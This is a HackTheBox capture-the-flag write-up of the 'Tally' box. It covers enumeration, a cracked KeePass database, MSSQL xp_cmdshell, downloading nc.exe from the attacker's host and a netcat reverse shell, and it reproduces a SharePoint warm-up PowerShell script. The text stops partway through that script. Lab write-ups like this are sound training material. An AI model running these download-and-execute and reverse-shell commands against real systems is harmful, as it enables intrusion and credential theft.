---
title: "HackTheBox Writeup: Tally"
date: 2019-10-08T21:49:37+02:00
toc: true
showdate: true
tags:
  - ctf
  - hackthebox
  - writeup
---

This box needs quite a few steps just to get the first flag, but it's pretty fair seen the Hard rating, and I believe it deserves it in a good way: Tally is a very fun box but it has a couple defects, first is the painfully slow Sharepoint web application, which made content discovery a chore, and then having to sift through a huge amount of useless (for the attacker, of course) files can waste some of your time but in a realistic scenario you are very likely to run into many, many files that the employees have on their computers but are of no use to you.

Other than that this box lets you play with a bit of everything: Sharepoint, FTP, SMB, MSSQL that lets you run commands via xp_cmdshell, and finally a split for privesc: you can either use rotten potato to become SYSTEM right away or hijack a scheduled task that runs every hour to execute arbitrary PowerShell code as Administrator. This box definitely gives you a lot to play with and I love it.

![img](/images/writeup-tally/1.png)

---

## Enumeration part 1: scanning

A basic nmap scan returns a lot of open ports:

```aaa
┌─[baud@parrot]─[~]
└──╼ $sudo nmap -sV -sC -oA tally/nmap 10.10.10.59
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 19:56 CEST
Nmap scan report for 10.10.10.59
Host is up (0.024s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-09-01T17:53:04
|_Not valid after:  2049-09-01T17:53:04
|_ssl-date: 2019-09-01T17:57:14+00:00; +16s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 15s, deviation: 0s, median: 15s
| ms-sql-info:
|   10.10.10.59:1433:
|     Version:
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-01 19:57:15
|_  start_date: 2019-09-01 19:52:31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.30 seconds
```

Two of the found ports are FTP and SMB but nmap couldn't log in any of these two so anonymous and guest login is not enabled. We also have a MSSQL server on port 1433 and IIS 10.0 which means Tally runs on either Windows 10 or Windows Server 2016. The smb-security-mode tells us something interesting, message signing is disabled for SMB1 and is not required for SMB2, which means an SMB relay attack could be possible.

The only port we can really try enumerating is 80, where we find an instance of Microsoft Sharepoint that doesn't seem to have any content:

![img](/images/writeup-tally/2.png)

Clicking on "Sign In" takes makes a login popup appear and none of the common user/password combinations work.

---

## Enumeration part 2: SharePoint

Running gobuster can show us if there is anything interesting that we can't see from the home page, and since we are dealing with a Sharepoint server we can use a specific wordlist to look for interesting content thtat belongs exclusively to Sharepoint, I use the wordlist from SecLists:

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $gobuster dir -u http://10.10.10.59 -o gobuster-scan -w ~/SecLists/Discovery/Web-Content/CMS/sharepoint.txt 2>/dev/null
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.59
[+] Threads:        10
[+] Wordlist:       /home/baud/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/01 22:27:22 Starting gobuster
===============================================================
```

I usually set the -t option a decent value but this would effectively launch a DoS against Tally because it would become unavailable for a few minutes after stopping to respond altogether, so enumerating this box is a little bit of a hassle if you're not careful. The output is ridiculously long and we cannot access most pages, but in the list there also are some very useful pages that should be checked on all Sharepoint sites, one of them being http://10.10.10.59/_layouts/15/viewlsts.aspx, which shows us the whole content of the site:

![img](/images/writeup-tally/3.png)

We got one item in Documents and one in Site Pages, let's focus on the Documents category first:

![img](/images/writeup-tally/4.png)

It contains a .docx file that is downloaded upon clicking, it doesn't contain any macros but this is what it says:

```aaa
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

This gives us access to FTP, so that's good, but we're missing user names. We know Administrator modified the file but that's not the right user for the password we found. In the other category we find another page:

![img](/images/writeup-tally/5.png)

And opening it gives us a few user names including one obviously dedicated for FTP:

```aaa
Migration update


Hi all,

Welcome to your new team page!

As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks – Sarah & Tim.
```

---

## Enumeration part 3: FTP


We can now connect to FTP with our found credentials:

```aaa
User: ftp_user
Pass: UTDRSCH53c"$6hys
```

```aaa
ftp> open 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:baud): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
08-31-17  11:51PM       <DIR>          From-Custodian
10-01-17  11:37PM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.
```

There are many files on the servers, if we want to take our time to analyse them all with a more comfortable interface instead of the FTP client we can use *wget* to download them all on our box (thank you Ippsec for this method!):

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
```

After exploring the files for a while something interesting pops up, KeePass files:

```aaa
┌─[baud@parrot]─[~/tally/ftp/10.10.10.59]
└──╼ $ls -la User/Tim/Files/
totale 12
drwxr-xr-x 1 baud baud   74 set  1 23:11 .
drwxr-xr-x 1 baud baud   40 set  1 23:11 ..
-rw-r--r-- 1 baud baud   17 set 15  2017 bonus.txt
drwxr-xr-x 1 baud baud  286 set  1 23:11 KeePass-2.36
-rw-r--r-- 1 baud baud  152 set  1 23:11 .listing
-rw-r--r-- 1 baud baud 2222 set 15  2017 tim.kdbx
┌─[✗]─[baud@parrot]─[~/tally/ftp/10.10.10.59]
└──╼ $file User/Tim/Files/tim.kdbx
User/Tim/Files/tim.kdbx: Keepass password database 2.x KDBX
```

KeePass is a password manager. The password databases are protected with a master password. but a very useful utility called *keepass2john* can create an input file for john from the database:

```aaa
┌─[baud@parrot]─[~/tally/ftp/10.10.10.59/User/Tim/Files]
└──╼ $keepass2john tim.kdbx > john.txt
┌─[baud@parrot]─[~/tally/ftp/10.10.10.59/User/Tim/Files]
└──╼ $cat john.txt
tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

*john* will detect the hash type by itself so let's give it rockyou.txt as dictionary and see if it can crack the database:

```aaa
┌─[✗]─[baud@parrot]─[~/tally]
└──╼ $john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
simplementeyo    (tim)
1g 0:00:01:14 DONE (2019-09-01 23:24) 0.01336g/s 330.1p/s 330.1c/s 330.1C/s simplementeyo..sept17
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

It worked and now we have the password to the database:

```aaa
simplementeyo
```

The password would have been found with hashcat as well, after using *keepass2john* run the following command:

```aaa
┌─[✗]─[baud@parrot]─[~/tally]
└──╼ $hashcat -a 0 -m 13400 /usr/share/wordlists/rockyou.txt john.txt --force
```

We can open the database with KeePassXC, which comes preinstalled on Kali and Parrot:

![img](/images/writeup-tally/6.png)

Here we can find more credentials:

```aaa
User: cisco
Pass: cisco123

User: Finance
Pass: Acc0unting
```

---

## Enumeration part 4: SMB

The second pair of credentials also says in the title: "TALLY ACCT share", so we can use the Finane account to access SMB:

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $smbclient -U Finance -L 10.10.10.59
Unable to initialize messaging context
Enter WORKGROUP\Finance's password:

    Sharename       Type      Comment
    ---------       ----      -------
    ACCT            Disk      
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.59 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Of course the one share we can access is ACCT:

```aaa
┌─[✗]─[baud@parrot]─[~/tally]
└──╼ $smbclient -U Finance //10.10.10.59/ACCT
Unable to initialize messaging context
Enter WORKGROUP\Finance's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Sep 18 07:58:18 2017
  ..                                  D        0  Mon Sep 18 07:58:18 2017
  Customers                           D        0  Sun Sep 17 22:28:40 2017
  Fees                                D        0  Mon Aug 28 23:20:52 2017
  Invoices                            D        0  Mon Aug 28 23:18:19 2017
  Jess                                D        0  Sun Sep 17 22:41:29 2017
  Payroll                             D        0  Mon Aug 28 23:13:32 2017
  Reports                             D        0  Fri Sep  1 22:50:11 2017
  Tax                                 D        0  Sun Sep 17 22:45:47 2017
  Transactions                        D        0  Wed Sep 13 21:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 22:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 22:49:13 2017

        8387839 blocks of size 4096. 710488 blocks available
smb: \>
```

Inside zz_Archived there's a txt file having a new pair of credentials, this time for MSSQL:

```aaa
smb: \zz_archived\> dir
  .                                   D        0  Fri Sep 15 22:29:35 2017
  ..                                  D        0  Fri Sep 15 22:29:35 2017
  2016 Audit                          D        0  Mon Aug 28 23:28:47 2017
  fund-list-2014.xlsx                 A    25874  Wed Sep 13 21:58:22 2017
  SQL                                 D        0  Fri Sep 15 22:29:36 2017

        8387839 blocks of size 4096. 710219 blocks available
smb: \zz_archived\> cd SQL
smb: \zz_archived\SQL\> dir
  .                                   D        0  Fri Sep 15 22:29:36 2017
  ..                                  D        0  Fri Sep 15 22:29:36 2017
  conn-info.txt                       A       77  Sun Sep 17 22:26:56 2017

        8387839 blocks of size 4096. 710205 blocks available
smb: \zz_archived\SQL\> get conn-info.txt
getting file \zz_archived\SQL\conn-info.txt of size 77 as conn-info.txt (0,4 KiloBytes/sec) (average 19,3 KiloBytes/sec)
smb: \zz_archived\SQL\>
```

The file says they are old:

```aaa
┌─[✗]─[baud@parrot]─[~/tally]
└──╼ $cat conn-info.txt
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

And in fact they do not work on MSSQL. Inspecting the share further a folder full of executables is found at \zz_imgration\binaries\, then inside \new folder\ there's another set of program, one of which is only called *tester.exe*, unlike all the other programs which look like commercial ones:

```aaa
smb: \zz_migration\binaries\new folder\> dir
  .                                   D        0  Thu Sep 21 08:21:09 2017
  ..                                  D        0  Thu Sep 21 08:21:09 2017
  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 21:56:38 2017
  Macabacus2016.exe                   A 18159024  Mon Sep 11 23:20:05 2017
  Orchard.Web.1.7.3.zip               A 21906356  Wed Aug 30 01:27:42 2017
  putty.exe                           A   774200  Sun Sep 17 22:19:26 2017
  RpprtSetup.exe                      A   483824  Fri Sep 15 21:49:46 2017
  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 23:13:14 2017
  tester.exe                          A   215552  Fri Sep  1 13:15:54 2017
  vcredist_x64.exe                    A  7194312  Wed Sep 13 22:06:28 2017

        8387839 blocks of size 4096. 707416 blocks available
smb: \zz_migration\binaries\new folder\> get tester.exe
getting file \zz_migration\binaries\new folder\tester.exe of size 215552 as tester.exe (992,9 KiloBytes/sec) (average 992,9 KiloBytes/sec)
smb: \zz_migration\binaries\new folder\>
```

A basic analysis of the executable with *strings* reveals something interesting:

```aaa
<$Xf
^_[3
SQLSTATE:
Message:
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
Unknown exception
```

A query for logging in a database is found, apparently on the orcharddb database woth the *sa* account, the SQL server is TALLY, so we can connect to it with the new credentials:

```aaa
User: sa
Pass: GWE3V65#6KFH93@4GWTG2G
```

---

## Exploitation: starting a shell from MSSQL using xp_cmdshell

Now we can connect to the database, I'll be using *sqsh* from command line as I first opened it with DBeaver and didn't find anything interesting in the tables, which means we are probably meant to access the console instead, which is more comfortable from terminal:

```aaa
┌─[✗]─[baud@parrot]─[~/tally]
└──╼ $sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Once inside the database we can try using the xp_cmdshell function to execute shell commands:

```aaa
1> xp_cmdshell 'whoami'
2> go

    output                                                                                                                     
                                                                                                                                   
                                                                                                                                   
                                                                                                                               

    ---------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------

    tally\sarah                                                                                                                
                                                                                                                                   
                                                                                                                                   
                                                                                                                               

    NULL                                                                                                                     
                                                                                                                                   
                                                                                                                               

(2 rows affected, return status = 0)
1>
```

We get an output back, which tells us the current user is Sarah. This is very uncomfortable to look at for every command of course, so instead of using this interface I'll be downloading nc.exe on the box and running it to get a reverse shell, although the xp_cmdshell procedure turned itself off after running just one command:

```
1> xp_cmdshell 'powershell invoke-webrequest http://10.10.14.37:9090/nc.exe -outfile nc.exe'
2> go
Msg 15281, Level 16, State 1
Server 'TALLY', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of
the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For
more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
1>
```

So we have to enable it manually:

```aaa
1> exec sp_configure 'show advanced options',1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> exec sp_configure 'xp_cmdshell',1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
```

Now we can download nc.exe from our box:

```aaa
1> xp_cmdshell 'powershell invoke-webrequest http://10.10.14.37:9090/nc.exe -outfile c:\users\sarah\downloads\nc.exe'
2> go
```

I had to specify an absolute path or else the file would have been downloaded in System32 and because we don't enough privileges to write in that folder the command would fail, so instead I chose our current user's Downloads folder and the file is downloaded correctly:

```aaa
┌─[baud@parrot]─[~/server]
└──╼ $php -S 0.0.0.0:9090 -t .
PHP 7.3.4-2 Development Server started at Mon Sep  2 00:55:31 2019
Listening on http://0.0.0.0:9090
Document root is /home/baud/server
Press Ctrl-C to quit.
[Mon Sep  2 01:03:20 2019] 10.10.10.59:51038 [200]: /nc.exe
```

We can launch it after starting our listener:

```aaa
1> xp_cmdshell 'c:\users\sarah\downloads\nc.exe -e cmd.exe 10.10.14.37 9999'
2> go
```

And the connection is received:

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.59] 51062
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
tally\sarah

C:\Windows\system32>
```

Sarah's desktop has the first flag. It also has another text file, a draft of a message for Tim:

```aaa
c:\Users\Sarah\Desktop>more "note to tim (draft).txt"
more "note to tim (draft).txt"
Hi Tim,

As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.

Thanks,
Sarah
```

And also a third text file:

```aaa
c:\Users\Sarah\Desktop>more todo.txt
more todo.txt
done:

install updates
check windows defender enabled

outstanding:

update intranet design
update server inventory
```aa

We also get a batch file:

```aaa
c:\Users\Sarah\Desktop>more browser.bat
more browser.bat

del C:\Users\Sarah\Desktop\session_id.txt

REM output current session information to file
qwinsta | findstr ">" > C:\Users\Sarah\Desktop\session_id.txt

REM query file for session id
FOR /F "tokens=3" %%a IN (C:\Users\Sarah\Desktop\session_id.txt) DO SET sessionid=%%a

del C:\Users\Sarah\Desktop\session_id.txt

REM only if console user, enter loop
if %sessionid% EQU 1 goto LOOP
if %sessionid% GTR 1 goto EXIT

:LOOP

REM kill any open instances of firefox and crashreporter
taskkill /F /IM firefox.exe > nul 2>&1
taskkill /F /IM crashreporter.exe > nul 2>&1

REM copy latest mockups to webroot
copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html

REM browse file
start "" "C:\Program Files (x86)\Mozilla Firefox\Firefox.exe" "http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html"

REM wait
ping 127.0.0.1 -n 80 > nul

if not ErrorLevel 1 goto :LOOP

:EXIT
exit
```

Another interesting thing and one of the roots to path is the .ps1 script:

```powershell
<#
.SYNOPSIS
        Warm up SharePoint IIS W3WP memory cache by loading pages from WebRequest

.DESCRIPTION
        Loads the full page so resources like CSS, JS, and images are included. Please modify lines 374-395 to suit your portal content design (popular URLs, custom pages, etc.)
        
        Comments and suggestions always welcome!  Please, use the issues panel at the project page.

.PARAMETER url
        A collection of url that will be added to the list of websites the script will fetch.
        
.PARAMETER install
        Typing "SPBestWarmUp.ps1 -install" will create a local Task Scheduler job under credentials of the current user. Job runs every 60 minutes on the hour to help automatically populate cache. Keeps cache full even after IIS daily recycle, WSP deployment, reboot, or other system events.

.PARAMETER installfarm
        Typing "SPBestWarmUp.ps1 -installfarm" will create a Task Scheduler job on all machines in the farm.

.PARAMETER uninstall
        Typing "SPBestWarmUp.ps1 -uninstall" will remove Task Scheduler job from all machines in the farm.
        
.PARAMETER user
        Typing "SPBestWarmUp.ps1 -user" provides the user name that will be used for the execution of the Task Scheduler job. If this parameter is missing it is assumed that the Task Scheduler job will be run with the current user.
        
.PARAMETER skiplog
        Typing "SPBestWarmUp.ps1 -skiplog" will avoid writing to the EventLog.
        
.PARAMETER allsites
        Typing "SPBestWarmUp.ps1 -allsites" will load every site and web URL. If the parameter skipsubwebs is used, only the root web of each site collection will be processed.

.PARAMETER skipsubwebs
        Typing "SPBestWarmUp.ps1 -skipsubwebs" will skip the subwebs of each site collection and only process the root web of the site collection.

.PARAMETER skipadmincheck
        Typing "SPBestWarmUp.ps1 -skipadmincheck" will skip checking of the current user is a local administrator. Local administrator rights are necessary for the installation of the Windows Task Scheduler but not necessary for simply running the warmup script.

.EXAMPLE
        .\SPBestWarmUp.ps1 -url "http://domainA.tld","http://domainB.tld"

.EXAMPLE
        .\SPBestWarmUp.ps1 -i
        .\SPBestWarmUp.ps1 -install

.EXAMPLE
        .\SPBestWarmUp.ps1 -f
        .\SPBestWarmUp.ps1 -installfarm

.EXAMPLE
        .\SPBestWarmUp.ps1 -f -user "Contoso\JaneDoe"
        .\SPBestWarmUp.ps1 -installfarm -user "Contoso\JaneDoe"

.EXAMPLE
        .\SPBestWarmUp.ps1 -u
        .\SPBestWarmUp.ps1 -uninstall

        
.NOTES  
        File Name:  SPBestWarmUp.ps1
        Author   :  Jeff Jones  - @spjeff
        Author   :  Hagen Deike - @hd_ka
        Author   :  Lars Fernhomberg
        Author   :  Charles Crossan - @crossan007
        Author   :  Leon Lennaerts - SPLeon
        Version  :  2.4.16
        Modified :  2017-07-13

.LINK
        https://github.com/spjeff/spbestwarmup
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$false, HelpMessage='A collection of URLs that will be fetched too')]
    [Alias("url")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("https?:\/\/\D+")]
    [string[]]$cmdurl,

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$false, HelpMessage='Use -install -i parameter to add script to Windows Task Scheduler on local machine')]
    [Alias("i")]
    [switch]$install,
        
    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$false, HelpMessage='Use -installfarm -f parameter to add script to Windows Task Scheduler on all farm machines')]
    [Alias("f")]
    [switch]$installfarm,
        
    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$false, HelpMessage='Use -uninstall -u parameter to remove Windows Task Scheduler job')]
    [Alias("u")]
    [switch]$uninstall,
        
        [Parameter(Mandatory=$False, Position=4, ValueFromPipeline=$false, HelpMessage='Use -user to provide the login of the user that will be used to run the script in the Windows Task Scheduler job')]
        [string]$user,
        
        [Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$false, HelpMessage='Use -skiplog -sl parameter to avoid writing to Event Log')]
        [Alias("sl")]
        [switch]$skiplog,
        
        [Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$false, HelpMessage='Use -allsites -all parameter to load every site and web (if skipsubwebs parameter is also given, only the root web will be processed)')]
        [Alias("all")]
        [switch]$allsites,

        [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$false, HelpMessage='Use -skipsubwebs -sw parameter to skip subwebs of each site collection and to process only the root web')]
        [Alias("sw")]
        [switch]$skipsubwebs,

        [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$false, HelpMessage='Use -skipadmincheck -sac parameter to skip checking if the current user is an administrator')]
        [Alias("sac")]
        [switch]$skipadmincheck,

        [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$false, HelpMessage='Use -skipserviceapps -ssa parameter to skip warmin up of Service Application Endpoints URLs')]
        [Alias("ssa")]
        [switch]$skipserviceapps
)

Function Installer() {
        # Add to Task Scheduler
        Write-Output "  Installing to Task Scheduler..."
        if(!$user) {
                $user = $ENV:USERDOMAIN + "\"+$ENV:USERNAME
        }
        Write-Output "  User for Task Scheduler job: $user"
        
    # Attempt to detect password from IIS Pool (if current user is local admin and farm account)
    $appPools = Get-WMIObject -Namespace "root/MicrosoftIISv2" -Class "IIsApplicationPoolSetting" | Select-Object WAMUserName, WAMUserPass
    foreach ($pool in $appPools) {                      
        if ($pool.WAMUserName -like $user) {
            $pass = $pool.WAMUserPass
            if ($pass) {
                break
            }
        }
    }
        
    # Manual input if auto detect failed
    if (!$pass) {
        $pass = Read-Host "Enter password for $user "
    }
        
        # Task Scheduler command
        $suffix += " -skipadmincheck"   #We do not need administrative rights on local machines to check the farm
        if ($allsites) {$suffix += " -allsites"}
        if ($skipsubwebs) {$suffix += " -skipsubwebs"}
        if ($skiplog) {$suffix += " -skiplog"}
        $cmd = "-ExecutionPolicy Bypass -File SPBestWarmUp.ps1" + $suffix
        
        # Target machines
        $machines = @()
        if ($installfarm -or $uninstall) {
                # Create farm wide on remote machines
                foreach ($srv in (Get-SPServer | Where-Object {$_.Role -ne "Invalid"})) {
                        $machines += $srv.Address
                }
        } else {
                # Create local on current machine
                $machines += "localhost"
        }
        $machines | ForEach-Object {
                if ($uninstall) {
                        # Delete task
                        Write-Output "SCHTASKS DELETE on $_"
                        schtasks /s $_ /delete /tn "SPBestWarmUp" /f
                        WriteLog "  [OK]" Green
                } else {
                        $xmlCmdPath = $cmdpath.Replace(".ps1", ".xml")
                        # Ensure that XML file is present
                        if(!(Test-Path $xmlCmdPath)) {
                                Write-Warning """$($xmlCmdPath)"" is missing. Cannot create timer job without missing file."
                                return
                        }

                        # Update xml file
                        Write-Host "xmlCmdPath - $xmlCmdPath"
                        $xml = [xml](Get-Content $xmlCmdPath)
                        $xml.Task.Principals.Principal.UserId = $user
                        $xml.Task.Actions.Exec.Arguments = $cmd
                        $xml.Task.Actions.Exec.WorkingDirectory = (Split-Path ($xmlCmdPath)).ToString()
                        $xml.Save($xmlCmdPath)

                        # Copy local file to remote UNC path machine
                        Write-Output "SCHTASKS CREATE on $_"
                        if ($_ -ne "localhost" -and $_ -ne $ENV:COMPUTERNAME) {
                                $dest = $cmdpath
                                $drive = $dest.substring(0,1)
                                $match =  Get-WMIObject -Class Win32_LogicalDisk | Where-Object {$_.DeviceID -eq ($drive+":") -and $_.DriveType -eq 3}
                                if ($match) {
                                        $dest = "\\" + $_ + "\" + $drive + "$" + $dest.substring(2,$dest.length-2)
                                        $xmlDest = $dest.Replace(".ps1", ".xml")
                                        mkdir (Split-Path $dest) -ErrorAction SilentlyContinue | Out-Null
                                        Write-Output $dest
                                        Copy-Item $cmdpath $dest -Confirm:$false
                                        Copy-Item $xmlCmdPath $xmlDest -Confirm:$false
                                }
                        }
                        # Create task
                        schtasks /s $_ /create /tn "SPBestWarmUp" /ru $user /rp $pass /xml $xmlCmdPath
                        WriteLog "  [OK]"  Green
                }
        }
}

Function WarmUp() {
    # Load plugin
    Add-PSSnapIn Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue

    # Warm up CMD parameter URLs
    $cmdurl | ForEach-Object {NavigateTo $_}

    # Warm up SharePoint web applications
    Write-Output "Opening Web Applications..."

        # Accessing the Alternate URls to warm up all "extended webs" (i.e. multiple IIS websites exists for one SharePoint webapp)
        $was = Get-SPWebApplication -IncludeCentralAdministration
        foreach ($wa in $was) {
                foreach ($alt in $wa.AlternateUrls) {
                        $url = $alt.PublicUrl
                        if(!$url.EndsWith("/")) {
                                $url = $url + "/"
                        }
                        NavigateTo $url
                        NavigateTo $url"_api/web"
                        NavigateTo $url"_api/_trust" # for ADFS, first user login
                        NavigateTo $url"_layouts/viewlsts.aspx"
                        NavigateTo $url"_vti_bin/UserProfileService.asmx"
                        NavigateTo $url"_vti_bin/sts/spsecuritytokenservice.svc"
                        NavigateTo $url"_api/search/query?querytext='warmup'"
                }
                
                # Warm Up Individual Site Collections and Sites
                if ($allsites) {
                        $sites = (Get-SPSite -WebApplication $wa -Limit ALL)
                        foreach($site in $sites) {
                                if($skipsubwebs)
                                {
                                        $url = $site.RootWeb.Url
                                        NavigateTo $url
                                }
                                else
                                {
                                        $webs = (Get-SPWeb -Site $site -Limit ALL)
                                        foreach($web in $webs){
                                                $url = $web.Url
                                                NavigateTo $url
                                        }
                                }
                        }
                }
                
        # Central Admin
        if ($wa.IsAdministrationWebApplication) {
            $url = $wa.Url
            NavigateTo $url"Lists/HealthReports/AllItems.aspx"
            NavigateTo $url"_admin/FarmServers.aspx"
            NavigateTo $url"_admin/Server.aspx"
            NavigateTo $url"_admin/WebApplicationList.aspx"
            NavigateTo $url"_admin/ServiceApplications.aspx"
                        
            # Manage Service Application
            $sa = Get-SPServiceApplication
            $links = $sa | ForEach-Object {$_.ManageLink.Url} | Select-Object -Unique
            foreach ($link in $links) {
                $ml = $link.TrimStart('/')
                NavigateTo "$url$ml"
            }
        }
    }
        
    # Warm up Service Applications
        if (!$skipserviceapps) {
        Get-SPServiceApplication | ForEach-Object {$_.EndPoints | ForEach-Object {$_.ListenUris | ForEach-Object {NavigateTo $_.AbsoluteUri}}}
        }

    # Warm up Project Server
    Write-Output "Opening Project Server PWAs..."
    if ((Get-Command Get-SPProjectWebInstance -ErrorAction SilentlyContinue).Count -gt 0) {
        Get-SPProjectWebInstance | ForEach-Object {
            # Thanks to Eugene Pavlikov for the snippet
            $url = ($_.Url).AbsoluteUri + "/"
                
            NavigateTo $url
            NavigateTo ($url + "_layouts/viewlsts.aspx")
            NavigateTo ($url + "_vti_bin/UserProfileService.asmx")
            NavigateTo ($url + "_vti_bin/sts/spsecuritytokenservice.svc")
            NavigateTo ($url + "Projects.aspx")
            NavigateTo ($url + "Approvals.aspx")
            NavigateTo ($url + "Tasks.aspx")
            NavigateTo ($url + "Resources.aspx")
            NavigateTo ($url + "ProjectBICenter/Pages/Default.aspx")
            NavigateTo ($url + "_layouts/15/pwa/Admin/Admin.aspx")
        }
    }

    # Warm up Topology
    NavigateTo "http://localhost:32843/Topology/topology.svc"
        
    # Warm up Host Name Site Collections (HNSC)
    Write-Output "Opening Host Name Site Collections (HNSC)..."
    $hnsc = Get-SPSite -Limit All | Where-Object {$_.HostHeaderIsSiteName -eq $true} | Select-Object Url
    foreach ($sc in $hnsc) {
        NavigateTo $sc.Url
    }

